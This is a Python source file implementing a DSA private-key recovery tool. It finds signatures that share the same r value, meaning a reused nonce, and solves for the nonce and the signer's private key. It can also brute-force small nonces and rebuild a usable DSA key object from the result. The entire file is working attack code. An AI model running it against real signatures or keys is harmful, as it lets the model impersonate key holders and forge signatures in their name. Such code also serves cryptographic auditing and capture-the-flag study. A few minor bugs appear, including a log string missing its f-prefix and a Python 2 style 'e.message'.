from Crypto.Random import random
from Crypto.PublicKey import DSA
from Crypto.PublicKey.pubkey import bignum,inverse
from Crypto.Hash import SHA
from Crypto.Util.number import bytes_to_long

import logging
LOG = logging.getLogger('DSAregenK')

class DSAregenK(object):
    def __init__(self, pubkey):
        self.samples = {}
        self.pubkey = pubkey
        LOG.debug('+ set: pubkey = {pubkey}')

    def add(self, signature, hash):
#           sample is of format ( (r,s),hash(data), pubkey)
#                      signature params,hashed_data
#                      individual pubkey
        (r, s) = signature
        if not isinstance(hash, int):
            hash = bytes_to_long(hash)
        sample = bignum(r), bignum(s), bignum(hash)

        if r not in self.samples:
            self.samples[r] = []

        self.samples[r].append(sample)

    def run(self, asDSAobj=False):
        # find samples with equal r in signature
        for c in self._find_candidates():
            LOG.debug(f'[*] reconstructing PrivKey for Candidate r={c}')
            (k, x) = self._attack(self.samples[c])
            if asDSAobj:
                yield self._construct_DSA((k, x))
            else:
                yield (k, x)

    def runBrute(self, asDSAobj=False, maxTries=None):
        for r, samples in self.samples.items():
            LOG.debug(f'[*] bruteforcing PrivKey for r={r}')
            for sample in samples:
                LOG.debug(f'[** - sample for r={r}]')
                try:
                    (k, x) = self._brute_k(sample, maxTries=maxTries)
                    if asDSAobj:
                        yield self._construct_DSA((k, x))
                    else:
                        yield (k, x)
                except Exception as e:
                    LOG.error(e.message)

    def _find_candidates(self):
#            candidates have same r
        candidates = []
        for r, vals in self.samples.items():
            if len(vals) > 1:
                candidates.append(r)
        return candidates

    def _attack(self,samples,q=None):
#           samples = r,s,long(hash)
        q = q or self.pubkey.q

        rA,sA,hA = samples[0]

        k_h_diff = hA
        k_s_diff = sA

        first = True
        for r, s, hash in samples:
            if first:
                first = False
                continue            #skip first one due to autofill
            k_h_diff -= hash
            k_s_diff -= s

        k = (k_h_diff) * inverse(k_s_diff, q) % q
        x = ((k * sA - hA) * inverse(rA, q) ) % q

        LOG.info(f'privkey reconstructed: k={k}; x={x};')
        return k, x

    def _construct_DSA(self, privkey):
        k,x = privkey
        return DSA.construct([self.pubkey.y,
                              self.pubkey.g,
                              self.pubkey.p,
                              self.pubkey.q,
                              x])

    def _attack_single(self, hA, sigA, hB, sigB, q=None):
        q = q or self.pubkey.q
        rA, sA = sigA
        rB, sB = sigB
        k = (hA - hB) * inverse(sA - sB, q) % q
        x = ((k * sA - hA)* inverse(rA, q)) % q
        return k, x

    def _brute_k(self, sample, p=None, q=None, g=None, maxTries=None):
#           sample = (r,s,h(m))
        # 1 < k < q
        p = p or self.pubkey.p
        q = q or self.pubkey.q
        g = g or self.pubkey.g

        r, s, h = sample

        k = 2
        while k < q - 1:
            if maxTries and k >= maxTries + 2:
                break
            # calc r = g^k mod p mod q
            if r == pow(g, k, p) % q:
                x = ((k * s - h) * inverse(r, q) ) % q
                return k, x
            k += 1        # next k
        raise Exception(f'Max tries reached! - {k-2}/{maxTries}')
